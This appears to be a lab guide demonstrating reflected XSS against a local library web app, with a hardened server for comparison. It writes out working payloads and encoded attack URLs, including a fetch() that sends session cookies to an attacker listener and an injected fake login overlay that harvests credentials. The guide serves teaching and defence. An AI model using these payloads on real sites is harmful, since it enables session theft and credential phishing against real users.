# Reflected XSS Attack Cheat Sheet & Demonstration Guide

This guide lists the exact payloads and crafted malicious URLs used to demonstrate **Reflected Cross-Site Scripting (XSS)** against the BookNook Library application.

---

## 🎯 Target Overview

| Environment | URL | Port | State |
|---|---|---|---|
| **Vulnerable Server** | `http://127.0.0.1:3000/` | `3000` | Reflected input is not sanitized or escaped. |
| **Secured / Fixed Server** | `http://127.0.0.1:3001/` | `3001` | HTML entity escaping + CSP + HttpOnly cookies. |
| **Attacker Listener Dashboard** | `http://127.0.0.1:3000/attacker/listener` | `3000` | Captures exfiltrated cookies and phished credentials. |

---

## 💥 Attack Payloads & Test Links

### 1. Basic Proof-of-Concept (Script Alert)
- **Objective:** Prove that arbitrary JavaScript code executes in the context of the user's browser session.
- **Raw Payload:**
  ```html
  <script>alert('Reflected XSS Executed! Origin: ' + document.domain)</script>
  ```
- **Crafted URL (Vulnerable Port 3000):**
  ```text
  http://127.0.0.1:3000/search?q=%3Cscript%3Ealert('Reflected%20XSS%20Executed!%20Origin:%20'%20%2B%20document.domain)%3C%2Fscript%3E
  ```
- **What Happens:**
  1. The server reflects the `<script>` tag directly into the response HTML.
  2. The browser's HTML parser interprets it as executable code and immediately triggers the modal dialog displaying the domain name.

---

### 2. Inline Event Handler Injection (Filter Bypass)
- **Objective:** Demonstrate that blocking the `<script>` keyword alone is insufficient to prevent XSS.
- **Raw Payload:**
  ```html
  <img src="invalid-image-source" onerror="alert('XSS triggered via <img> onerror event!')">
  ```
- **Crafted URL (Vulnerable Port 3000):**
  ```text
  http://127.0.0.1:3000/search?q=%3Cimg%20src=x%20onerror=%22alert('XSS%20triggered%20via%20img%20onerror%20event!')%22%3E
  ```
- **What Happens:**
  1. The browser attempts to load the image at `src="x"`.
  2. The load fails, triggering the `onerror` event handler, which executes the JavaScript payload.

---

### 3. Session Cookie Theft / Exfiltration (Real-World Impact)
- **Objective:** Steal the victim's authentication cookie (`auth_session`) and exfiltrate it to the attacker's server without the victim noticing.
- **Raw Payload:**
  ```html
  <script>
    fetch('/attacker/collect?stolen_cookie=' + encodeURIComponent(document.cookie));
    alert('Session Cookie Stolen!\n\nExtracted: ' + document.cookie);
  </script>
  ```
- **Crafted URL (Vulnerable Port 3000):**
  ```text
  http://127.0.0.1:3000/search?q=%3Cscript%3Efetch('/attacker/collect?stolen_cookie='%20%2B%20encodeURIComponent(document.cookie));alert('Session%20Cookie%20Stolen!\n\nExtracted:%20'%20%2B%20document.cookie);%3C%2Fscript%3E
  ```
- **Demonstration Step:**
  1. Click or navigate to the malicious link on port 3000.
  2. The alert confirms that `document.cookie` was accessed.
  3. Open the **Attacker Dashboard** at `http://127.0.0.1:3000/attacker/listener` to see the victim's captured `auth_session` token!

---

### 4. DOM Defacement & Credential Phishing Overlay
- **Objective:** Inject a malicious modal overlay that mimics a "Session Expired" prompt, tricking the user into typing their credentials.
- **Raw Payload:**
  ```html
  <div class='fake-phishing-modal'>
    <div class='phishing-card'>
      <h3>⚠️ Session Expired</h3>
      <p>Please re-enter your credentials to continue accessing BookNook.</p>
      <form onsubmit='submitFakePhish(event)'>
        <input type='email' id='phish-email' placeholder='Email / Student ID' value='alice@university.edu' required>
        <input type='password' id='phish-pass' placeholder='Password' required>
        <button type='submit'>Login Now</button>
      </form>
    </div>
  </div>
  ```
- **Crafted URL (Vulnerable Port 3000):**
  ```text
  http://127.0.0.1:3000/search?q=%3Cdiv%20class=%27fake-phishing-modal%27%3E%3Cdiv%20class=%27phishing-card%27%3E%3Ch3%3E%E2%9A%A0%EF%B8%8F%20Session%20Expired%3C%2Fh3%3E%3Cp%3EPlease%20re-enter%20your%20credentials%20to%20continue%20accessing%20BookNook.%3C%2Fp%3E%3Cform%20onsubmit=%27submitFakePhish(event)%27%3E%3Cinput%20type=%27email%27%20id=%27phish-email%27%20placeholder=%27Email%20%2F%20Student%20ID%27%20value=%27alice%40university.edu%27%20required%3E%3Cinput%20type=%27password%27%20id=%27phish-pass%27%20placeholder=%27Password%27%20required%3E%3Cbutton%20type=%27submit%27%3ELogin%20Now%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E%3C%2Fdiv%3E
  ```
- **Demonstration Step:**
  1. Open the URL; the phishing modal appears seamlessly over the library interface.
  2. Type any password (e.g. `P@ssword123!`) and click **Login Now**.
  3. Switch to the **Attacker Dashboard** (`/attacker/listener`) to reveal the harvested login credentials!

---

## 🛡️ Verification on Hardened Server (Port 3001)

Test the exact same links against the secure server at `http://127.0.0.1:3001/`:

1. **PoC Link:** `http://127.0.0.1:3001/search?q=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E`
   - *Result:* The page displays the text `Showing search results for: <script>alert('XSS')</script>`. **No alert executes!**
2. **Cookie Exfiltration Link:** `http://127.0.0.1:3001/search?q=%3Cscript%3Efetch('/attacker/collect?stolen='%2Bdocument.cookie)%3C%2Fscript%3E`
   - *Result:* Neutralized as harmless text. Furthermore, the cookie is flagged `HttpOnly`, making it completely inaccessible to client-side scripts.
